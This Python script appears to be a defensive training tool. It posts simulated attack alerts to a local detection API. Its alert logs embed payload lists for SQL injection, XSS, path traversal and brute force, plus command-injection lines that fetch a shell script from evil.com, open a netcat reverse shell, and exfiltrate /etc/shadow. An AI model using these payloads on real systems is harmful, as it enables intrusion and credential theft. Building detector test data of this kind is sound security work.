#!/usr/bin/env python3
"""
Attack Simulator - Generates realistic security alerts for ML training
Simulates various attack patterns to test ML behavioral analysis
"""
import requests
import time
import random
from datetime import datetime
import json

API_URL = "http://localhost:8000"
JUICESHOP_URL = "http://localhost:3000"

# Colors for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'

def print_banner():
    banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════╗
║           ATTACK SIMULATOR - ML TRAINING TOOL             ║
║       Generate Realistic Attacks for Behavioral ML        ║
╚═══════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

def create_alert(rule_id, description, severity, log_data, source_ip):
    """Create an alert in the system"""
    try:
        response = requests.post(
            f"{API_URL}/alerts",
            json={
                "rule_id": rule_id,
                "rule_description": description,
                "host": "juiceshop",
                "severity": severity,
                "raw_data": {
                    "log": log_data,
                    "source_ip": source_ip,
                    "timestamp": datetime.utcnow().isoformat(),
                    "user_agent": random.choice([
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                        "sqlmap/1.4.7",
                        "Nmap/7.91",
                        "curl/7.68.0",
                        "python-requests/2.25.1"
                    ])
                }
            },
            timeout=5
        )
        return response.status_code == 200
    except Exception as e:
        print(f"{Colors.RED}✗ Error creating alert: {e}{Colors.END}")
        return False

# ============================================================================
# ATTACK SCENARIO 1: SQL Injection Campaign
# ============================================================================

def sql_injection_campaign():
    """Simulate a SQL injection attack campaign"""
    print(f"\n{Colors.YELLOW}[SCENARIO 1] SQL Injection Campaign{Colors.END}")
    print(f"{Colors.BLUE}Simulating: Attacker trying various SQL injection techniques{Colors.END}\n")
    
    attacker_ip = "192.168.1.100"
    payloads = [
        ("admin'--", "Basic SQL comment injection"),
        ("' OR '1'='1", "Boolean-based blind SQLi"),
        ("' OR 1=1--", "Authentication bypass"),
        ("admin' UNION SELECT NULL,NULL,NULL--", "UNION-based SQLi"),
        ("1' AND SLEEP(5)--", "Time-based blind SQLi"),
        ("'; DROP TABLE users--", "Destructive SQL injection"),
        ("admin'/**/OR/**/1=1--", "Obfuscated SQLi"),
        ("1' AND (SELECT * FROM users)--", "Subquery injection"),
    ]
    
    for i, (payload, desc) in enumerate(payloads, 1):
        log = f"POST /rest/user/login email={payload} password=test"
        print(f"  {i}/8 {desc}... ", end="")
        
        if create_alert(
            "SQLI-001",
            "SQL Injection - Authentication Bypass",
            12,
            log,
            attacker_ip
        ):
            print(f"{Colors.GREEN}✓{Colors.END}")
        else:
            print(f"{Colors.RED}✗{Colors.END}")
        
        time.sleep(1)
    
    print(f"\n{Colors.GREEN}✓ SQL Injection campaign complete{Colors.END}")
    return len(payloads)

# ============================================================================
# ATTACK SCENARIO 2: XSS Attack Variations
# ============================================================================

def xss_attack_variations():
    """Simulate various XSS attack attempts"""
    print(f"\n{Colors.YELLOW}[SCENARIO 2] Cross-Site Scripting (XSS) Attacks{Colors.END}")
    print(f"{Colors.BLUE}Simulating: Different XSS payloads and evasion techniques{Colors.END}\n")
    
    attacker_ip = "10.0.0.150"
    payloads = [
        ("<script>alert('XSS')</script>", "Basic script tag"),
        ("<img src=x onerror=alert('XSS')>", "Event handler XSS"),
        ("<svg onload=alert('XSS')>", "SVG-based XSS"),
        ("javascript:alert('XSS')", "JavaScript protocol"),
        ("<iframe src='javascript:alert(1)'>", "Iframe injection"),
        ("<body onload=alert('XSS')>", "Body onload event"),
        ("<input onfocus=alert('XSS') autofocus>", "Input focus XSS"),
        ("<marquee onstart=alert('XSS')>", "Marquee XSS"),
    ]
    
    for i, (payload, desc) in enumerate(payloads, 1):
        log = f"GET /profile?name={payload}"
        print(f"  {i}/8 {desc}... ", end="")
        
        if create_alert(
            "XSS-001",
            "Cross-Site Scripting Detected",
            9,
            log,
            attacker_ip
        ):
            print(f"{Colors.GREEN}✓{Colors.END}")
        else:
            print(f"{Colors.RED}✗{Colors.END}")
        
        time.sleep(1)
    
    print(f"\n{Colors.GREEN}✓ XSS attack variations complete{Colors.END}")
    return len(payloads)

# ============================================================================
# ATTACK SCENARIO 3: Path Traversal Attempts
# ============================================================================

def path_traversal_attempts():
    """Simulate directory traversal attacks"""
    print(f"\n{Colors.YELLOW}[SCENARIO 3] Path Traversal / Directory Traversal{Colors.END}")
    print(f"{Colors.BLUE}Simulating: Attempts to access sensitive files{Colors.END}\n")
    
    attacker_ip = "172.16.0.50"
    payloads = [
        ("../../../etc/passwd", "Linux password file"),
        ("..\\..\\..\\windows\\system32\\config\\sam", "Windows SAM file"),
        ("../../../../var/log/apache/access.log", "Log file access"),
        ("../../app/config/database.yml", "Config file access"),
        ("../../../root/.ssh/id_rsa", "SSH private key"),
        ("....//....//....//etc/passwd", "Double encoding"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoded"),
        ("..%252f..%252f..%252fetc%252fpasswd", "Double URL encoding"),
    ]
    
    for i, (payload, desc) in enumerate(payloads, 1):
        log = f"GET /file?path={payload}"
        print(f"  {i}/8 {desc}... ", end="")
        
        if create_alert(
            "PATH-001",
            "Path Traversal Detected",
            10,
            log,
            attacker_ip
        ):
            print(f"{Colors.GREEN}✓{Colors.END}")
        else:
            print(f"{Colors.RED}✗{Colors.END}")
        
        time.sleep(1)
    
    print(f"\n{Colors.GREEN}✓ Path traversal attempts complete{Colors.END}")
    return len(payloads)

# ============================================================================
# ATTACK SCENARIO 4: Brute Force Attack
# ============================================================================

def brute_force_attack():
    """Simulate credential brute force attack"""
    print(f"\n{Colors.YELLOW}[SCENARIO 4] Brute Force Login Attack{Colors.END}")
    print(f"{Colors.BLUE}Simulating: Rapid login attempts with common passwords{Colors.END}\n")
    
    attacker_ip = "203.0.113.42"
    passwords = [
        "admin", "password", "123456", "admin123", "root", 
        "password123", "qwerty", "letmein", "welcome", "admin1",
        "Password1", "pass123", "administrator", "12345678", "admin@123"
    ]
    
    for i, pwd in enumerate(passwords, 1):
        log = f"POST /rest/user/login email=admin@juice-sh.op password={pwd}"
        print(f"  {i}/15 Trying password: {pwd}... ", end="")
        
        if create_alert(
            "BRUTE-001",
            "Brute Force Login Attempt",
            8,
            log,
            attacker_ip
        ):
            print(f"{Colors.GREEN}✓{Colors.END}")
        else:
            print(f"{Colors.RED}✗{Colors.END}")
        
        time.sleep(0.5)  # Rapid attempts
    
    print(f"\n{Colors.GREEN}✓ Brute force attack complete{Colors.END}")
    return len(passwords)

# ============================================================================
# ATTACK SCENARIO 5: Command Injection
# ============================================================================

def command_injection_attack():
    """Simulate OS command injection attempts"""
    print(f"\n{Colors.YELLOW}[SCENARIO 5] Command Injection Attack{Colors.END}")
    print(f"{Colors.BLUE}Simulating: OS command injection payloads{Colors.END}\n")
    
    attacker_ip = "198.51.100.75"
    payloads = [
        ("; ls -la", "List directory"),
        ("| cat /etc/passwd", "Read passwd file"),
        ("& whoami", "Get current user"),
        ("`id`", "Execute id command"),
        ("$(wget http://evil.com/shell.sh)", "Download malware"),
        ("; nc -e /bin/sh attacker.com 4444", "Reverse shell"),
        ("| curl http://evil.com/exfiltrate?data=$(cat /etc/shadow)", "Data exfiltration"),
    ]
    
    for i, (payload, desc) in enumerate(payloads, 1):
        log = f"GET /ping?host=127.0.0.1{payload}"
        print(f"  {i}/7 {desc}... ", end="")
        
        if create_alert(
            "CMD-001",
            "Command Injection Detected",
            12,
            log,
            attacker_ip
        ):
            print(f"{Colors.GREEN}✓{Colors.END}")
        else:
            print(f"{Colors.RED}✗{Colors.END}")
        
        time.sleep(1)
    
    print(f"\n{Colors.GREEN}✓ Command injection attack complete{Colors.END}")
    return len(payloads)

# ============================================================================
# ATTACK SCENARIO 6: Multi-Stage APT Simulation
# ============================================================================

def advanced_persistent_threat():
    """Simulate a sophisticated multi-stage APT attack"""
    print(f"\n{Colors.YELLOW}[SCENARIO 6] Advanced Persistent Threat (APT){Colors.END}")
    print(f"{Colors.BLUE}Simulating: Multi-stage sophisticated attack{Colors.END}\n")
    
    attacker_ip = "45.33.32.156"
    
    stages = [
        # Stage 1: Reconnaissance
        ("GET /robots.txt", "RECON-001", "Reconnaissance - Robots.txt", 3),
        ("GET /sitemap.xml", "RECON-001", "Reconnaissance - Sitemap", 3),
        ("GET /.git/config", "RECON-002", "Source Code Disclosure Attempt", 6),
        
        # Stage 2: Initial Access
        ("POST /rest/user/login email=admin'-- password=x", "SQLI-001", "Initial Access - SQL Injection", 10),
        
        # Stage 3: Privilege Escalation  
        ("GET /rest/admin/users", "AUTHZ-001", "Unauthorized Access to Admin Panel", 11),
        
        # Stage 4: Lateral Movement
        ("GET /rest/products/search?q=')) UNION SELECT * FROM users--", "SQLI-002", "Database Enumeration", 12),
        
        # Stage 5: Data Exfiltration
        ("GET /api/users?limit=10000", "EXFIL-001", "Mass Data Extraction", 12),
    ]
    
    for i, (log, rule_id, desc, severity) in enumerate(stages, 1):
        print(f"  Stage {i}/7: {desc}... ", end="")
        
        if create_alert(rule_id, desc, severity, log, attacker_ip):
            print(f"{Colors.GREEN}✓{Colors.END}")
        else:
            print(f"{Colors.RED}✗{Colors.END}")
        
        time.sleep(2)  # Slow, stealthy attack
    
    print(f"\n{Colors.GREEN}✓ APT simulation complete (Multi-stage attack detected!){Colors.END}")
    return len(stages)

# ============================================================================
# ATTACK SCENARIO 7: Polymorphic Attack (ML Test)
# ============================================================================

def polymorphic_attack():
    """Simulate polymorphic attack that changes patterns"""
    print(f"\n{Colors.YELLOW}[SCENARIO 7] Polymorphic Attack (ML Behavioral Test){Colors.END}")
    print(f"{Colors.BLUE}Simulating: Attack that changes patterns to evade rules{Colors.END}\n")
    
    attacker_ip = "87.65.43.21"
    
    # These attacks look different but have similar behavior
    attacks = [
        ("admin'+OR+'1'='1", "Variant 1: Spaced OR"),
        ("admin'/*comment*/OR/*comment*/'1'='1", "Variant 2: SQL comments"),
        ("admin'||'1'='1", "Variant 3: Concatenation"),
        ("admin'\nOR\n'1'='1", "Variant 4: Newlines"),
        ("admin'OR'1'='1", "Variant 5: No spaces"),
        ("ADMIN'oR'1'='1", "Variant 6: Case variation"),
        ("admin'%20OR%20'1'='1", "Variant 7: URL encoded"),
        ("admin'\tOR\t'1'='1", "Variant 8: Tabs"),
    ]
    
    for i, (payload, desc) in enumerate(attacks, 1):
        log = f"POST /rest/user/login email={payload} password=test"
        print(f"  {i}/8 {desc}... ", end="")
        
        # Create with unusual characteristics to trigger ML
        if create_alert(
            "POLY-001",
            "Polymorphic Attack Pattern",
            10,
            log,
            attacker_ip
        ):
            print(f"{Colors.GREEN}✓{Colors.END}")
        else:
            print(f"{Colors.RED}✗{Colors.END}")
        
        time.sleep(1)
    
    print(f"\n{Colors.GREEN}✓ Polymorphic attack complete (ML should detect behavioral similarity!){Colors.END}")
    return len(attacks)

# ============================================================================
# ATTACK SCENARIO 8: Anomalous Behavior (No Rule Match)
# ============================================================================

def anomalous_behavior_attack():
    """Create alerts that don't match any rules but are suspicious"""
    print(f"\n{Colors.YELLOW}[SCENARIO 8] Zero-Day / Anomalous Behavior{Colors.END}")
    print(f"{Colors.BLUE}Simulating: Suspicious behavior with no rule match (ML test){Colors.END}\n")
    
    attacker_ip = "93.184.216.34"
    
    anomalies = [
        # Extremely long requests
        ("GET /search?q=" + "A" * 5000, "ANOMALY-001", "Unusually Long Request", 6),
        
        # Unusual time (simulated - would be 3 AM)
        ("POST /api/feedback comment=test", "ANOMALY-002", "Activity During Unusual Hours", 5),
        
        # High special character density
        ("GET /api?p=!@#$%^&*(){}[]|\\;:'\"<>,.?/~`", "ANOMALY-003", "High Special Character Density", 7),
        
        # Rapid requests (simulated)
        ("GET /api/products", "ANOMALY-004", "Rapid Sequential Requests", 6),
        
        # Unusual parameter combinations
        ("GET /api?a=1&b=2&c=3&d=4&e=5&f=6&g=7&h=8&i=9&j=10", "ANOMALY-005", "Excessive Parameters", 5),
    ]
    
    for i, (log, rule_id, desc, severity) in enumerate(anomalies, 1):
        print(f"  {i}/5 {desc}... ", end="")
        
        if create_alert(rule_id, desc, severity, log, attacker_ip):
            print(f"{Colors.GREEN}✓{Colors.END}")
        else:
            print(f"{Colors.RED}✗{Colors.END}")
        
        time.sleep(1)
    
    print(f"\n{Colors.GREEN}✓ Anomalous behavior simulation complete{Colors.END}")
    print(f"{Colors.CYAN}💡 ML should detect these as behavioral anomalies!{Colors.END}")
    return len(anomalies)

# ============================================================================
# ATTACK SCENARIO 9: Low & Slow Attack
# ============================================================================

def low_and_slow_attack():
    """Simulate a stealthy low-and-slow attack"""
    print(f"\n{Colors.YELLOW}[SCENARIO 9] Low & Slow Attack (Stealthy){Colors.END}")
    print(f"{Colors.BLUE}Simulating: Slow, patient attacker to avoid detection{Colors.END}\n")
    
    attacker_ip = "104.28.16.35"
    
    attempts = [
        "admin' OR '1'='1",
        "admin'--",
        "' OR 1=1--",
        "admin' UNION SELECT NULL--",
    ]
    
    for i, payload in enumerate(attempts, 1):
        log = f"POST /rest/user/login email={payload} password=test"
        print(f"  {i}/4 Attempt {i} (waiting 5 seconds between attempts)... ", end="")
        
        if create_alert(
            "SQLI-001",
            "SQL Injection - Slow Attack",
            8,
            log,
            attacker_ip
        ):
            print(f"{Colors.GREEN}✓{Colors.END}")
        else:
            print(f"{Colors.RED}✗{Colors.END}")
        
        if i < len(attempts):
            time.sleep(5)  # Slow down to avoid detection
    
    print(f"\n{Colors.GREEN}✓ Low & slow attack complete{Colors.END}")
    return len(attempts)

# ============================================================================
# Main Menu
# ============================================================================

def run_all_scenarios():
    """Run all attack scenarios"""
    print_banner()
    print(f"{Colors.MAGENTA}Running ALL attack scenarios...{Colors.END}\n")
    
    total_alerts = 0
    
    scenarios = [
        ("SQL Injection Campaign", sql_injection_campaign),
        ("XSS Attack Variations", xss_attack_variations),
        ("Path Traversal Attempts", path_traversal_attempts),
        ("Brute Force Attack", brute_force_attack),
        ("Command Injection", command_injection_attack),
        ("Advanced Persistent Threat", advanced_persistent_threat),
        ("Polymorphic Attack", polymorphic_attack),
        ("Anomalous Behavior", anomalous_behavior_attack),
        ("Low & Slow Attack", low_and_slow_attack),
    ]
    
    for name, func in scenarios:
        alerts = func()
        total_alerts += alerts
        time.sleep(2)
    
    print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.GREEN}✓ ALL SCENARIOS COMPLETE{Colors.END}")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"\nTotal Alerts Generated: {Colors.YELLOW}{total_alerts}{Colors.END}")
    print(f"\n{Colors.MAGENTA}Next Steps:{Colors.END}")
    print(f"  1. View alerts: {Colors.CYAN}http://localhost:3001{Colors.END}")
    print(f"  2. Run ML analysis on any alert")
    print(f"  3. Check ML Cyber Consultant tab for insights")
    print(f"  4. View behavioral anomaly detection results")
    print(f"\n{Colors.YELLOW}Wait 30 seconds, then check recommendations:{Colors.END}")
    print(f"  curl http://localhost:8000/soc/rule-recommendations | python3 -m json.tool\n")

def interactive_menu():
    """Interactive menu for selecting scenarios"""
    print_banner()
    
    menu = f"""
{Colors.CYAN}Select Attack Scenario:{Colors.END}

{Colors.YELLOW}[1]{Colors.END} SQL Injection Campaign (8 variants)
{Colors.YELLOW}[2]{Colors.END} XSS Attack Variations (8 payloads)
{Colors.YELLOW}[3]{Colors.END} Path Traversal Attempts (8 techniques)
{Colors.YELLOW}[4]{Colors.END} Brute Force Attack (15 attempts)
{Colors.YELLOW}[5]{Colors.END} Command Injection (7 payloads)
{Colors.YELLOW}[6]{Colors.END} Advanced Persistent Threat (7-stage attack)
{Colors.YELLOW}[7]{Colors.END} Polymorphic Attack (ML behavioral test)
{Colors.YELLOW}[8]{Colors.END} Anomalous Behavior (Zero-day simulation)
{Colors.YELLOW}[9]{Colors.END} Low & Slow Attack (Stealthy)

{Colors.GREEN}[A]{Colors.END} Run ALL Scenarios (Recommended for demo!)
{Colors.RED}[Q]{Colors.END} Quit

"""
    
    scenarios = {
        '1': sql_injection_campaign,
        '2': xss_attack_variations,
        '3': path_traversal_attempts,
        '4': brute_force_attack,
        '5': command_injection_attack,
        '6': advanced_persistent_threat,
        '7': polymorphic_attack,
        '8': anomalous_behavior_attack,
        '9': low_and_slow_attack,
    }
    
    while True:
        print(menu)
        choice = input(f"{Colors.CYAN}Enter your choice: {Colors.END}").strip().upper()
        
        if choice == 'Q':
            print(f"\n{Colors.GREEN}Goodbye!{Colors.END}\n")
            break
        elif choice == 'A':
            run_all_scenarios()
            break
        elif choice in scenarios:
            print_banner()
            alerts = scenarios[choice]()
            print(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.END}")
            input()
        else:
            print(f"\n{Colors.RED}Invalid choice. Please try again.{Colors.END}\n")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == '--all':
        run_all_scenarios()
    else:
        interactive_menu()
